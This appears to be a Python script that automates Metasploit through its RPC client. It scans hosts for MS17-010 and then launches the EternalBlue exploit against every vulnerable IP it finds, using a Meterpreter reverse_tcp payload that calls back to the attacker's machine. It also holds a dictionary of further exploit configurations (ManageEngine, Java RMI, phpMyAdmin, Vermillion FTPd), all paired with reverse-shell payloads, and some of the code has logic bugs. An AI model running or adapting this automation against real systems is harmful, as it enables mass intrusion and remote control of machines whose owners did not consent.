from metasploit_script import *
from json_data_processing_script import *
from web_query_and_process_script import *

import pdb
import socket


#####################################################AUTO SCAN PART#####################################################
def script_automate_scan():
    '''

    @return: list data from the metasploit console, the rpc client and the console associated to this client
    '''
    # check failure version
    ip_version_vuln = look_for_version()
    # print(opened_vuln_port)

    # test with putting an unexploitable
    # ip_vuln.append(('172.16.1.1','445'))
    # print(ip_vuln)

    # launch metasploit
    client, console = main_connection()
    # print(client)

    ####################################GET IP HOSTNAME#########################################
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    hostname = s.getsockname()[0]
    s.close()

    # pdb.set_trace()
    #######################################CHECK OPENED PORT####################################
    for tuple_info in ip_version_vuln:
        ###################################ETERNALBLUE SECTION##################################
        if ('Microsoft Windows Server 2008 R2' or 'Windows 7') in tuple_info[2]:
            auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
            exploit_name = 'windows/smb/ms17_010_eternalblue'

            ######################################GET IP VULN FOR 445###############################

            vuln_ip_smb = tuple_info[0]
            # print(vuln_ip_445)

            ######################################AUXILIARY SCAN####################################
            data_read_out = []
            data_console = main_enter_console_for_scan(auxiliary_scan, vuln_ip_smb, console)
            # pdb.set_trace()
            if data_console != -1:
                if 'Host is likely VULNERABLE to MS17-010!' in data_console['data']:
                    data_read_out.append(
                        'ip : ' + vuln_ip_smb + ' ; ' + ' Host is likely VULNERABLE to : ' + exploit_name)
                elif 'OptionValidateError' in data_console['data']:
                    data_read_out.append(
                        'ip : ' + vuln_ip_smb + ' ; ' + ' OptionValidateError : Auxiliary failed : ' + exploit_name)

                # if '8020' in opened_vuln_port:

                return data_read_out, client, console

    return -1


###############################################AUTO RUN EXPLOIT PART####################################################
def script_automate_exploit(data_read_out, client, console):
    '''

    @param data_read_out: list data from the metasploit console
    @param client: client rpc
    @param console: console associated to the client rpc
    @return: rpc client with the created sessions for this client
    '''
    # check opened port
    opened_vuln_port, ip_vuln = look_for_port()
    ip_vuln_reconf = []
    # print(opened_vuln_port)

    # test with putting an unexploitable
    # ip_vuln.append(('172.16.1.1','445'))
    # print(ip_vuln)

    # print(client)

    ####################################GET IP HOSTNAME#########################################
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    hostname = s.getsockname()[0]
    s.close()

    # pdb.set_trace()
    # extract ip from data_read_outh which is a list of string which mentions possible vulnerable ip
    for data in data_read_out:
        for ip in ip_vuln:
            if ip[0] in data and ip[0] not in ip_vuln_reconf:
                ip_vuln_reconf.append(ip[0])

    for str_data in data_read_out:
        if 'eternalblue' in str_data:
            #######################################CONFIG EXPLOIT####################################
            auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
            exploit_name = 'windows/smb/ms17_010_eternalblue'

            #####################################GET EXPLOIT########################################

            exploit = main_run_exploit(exploit_name, client)

            #######################################CONFIG OPTIONS AND PAYLOAD#######################

            # pdb.set_trace()
            running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR', exploit)

            payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
            running_config_payload = main_config_payload('LHOST', hostname, 'STR', payload)

            for ip in ip_vuln_reconf:
                # print(ip)
                main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
                json_data, session_create = main_exe_exploit(payload, exploit, client)

                # if session_create == -1:

            print(client.sessions.list)
            sessions_created = client.sessions.list
            return client, sessions_created

    return client, -1


# data, client, console = script_automate_scan()
# print(data, client, console)
#
# script_automate_exploit(data, client, console)


###############################################NEW PROCESS IN BUILDING##################################################

def get_board_exploit(client):
    # pdb.set_trace()
    board_of_exploit = []
    data = get_port_id_and_name()  # json script
    print(data, '\n')
    data2 = create_requete_for_exploitdb(data)  # json script
    print(data2, '\n')
    data3 = improve_research(data2)  # json script
    print(data3, '\n')
    for query in data3:
        table = exploitdb_query(query)  # query script
        output_rows = retrieve_from_html_exploitdb(table)  # query script
        exploit = retrieve_exploit_from_db_info(output_rows, client)  # metasploit_script
        if exploit != -1:
            for item in exploit:
                board_of_exploit.append(item)

    board_of_exploit = list(set(board_of_exploit))
    return board_of_exploit


####################################DICTONNARY OF EXPLOIT CONFIG FOR AUTOMATISATION#####################################

dictionnary_config_exploit = {'windows/smb/ms17_010_eternalblue': {
    'RHOST': '',
    'CheckModule': 'auxiliary/scanner/smb/smb_ms17_010',
    'Payload': 'windows/x64/meterpreter/reverse_tcp',
    'LHOST': ''
},
    'windows/smb/ms17_010_eternalblue_win8': {
        'RHOST': '',
        'Payload': 'windows/x64/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/misc/java_jmx_server': {
        'RHOSTS': '',
        'RPORT': '',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/smb/ms17_010_psexec': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/scanner/smb/smb_ms17_010',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/misc/java_rmi_server': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/scanner/misc/java_rmi_server',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_connectionid_write': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_apps_mngr': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOSTS': ''
    },
    'windows/misc/manageengine_eventlog_analyzer_rce': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOSTS': ''
    },
    'multi/http/phpmyadmin_null_termination_exec': {
        'RHOSTS': '',
        'Payload': 'php/meterpreter/reverse_tcp',
        'LHOSTS': ''
    },
    'multi/http/manageengine_sd_uploader': {
        'RHOSTS': '',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOSTS': ''
    },
    'windows/ftp/vermillion_ftpd_port': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOSTS': ''
    },
    'windows/http/manageengine_appmanager_exec': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    }

}
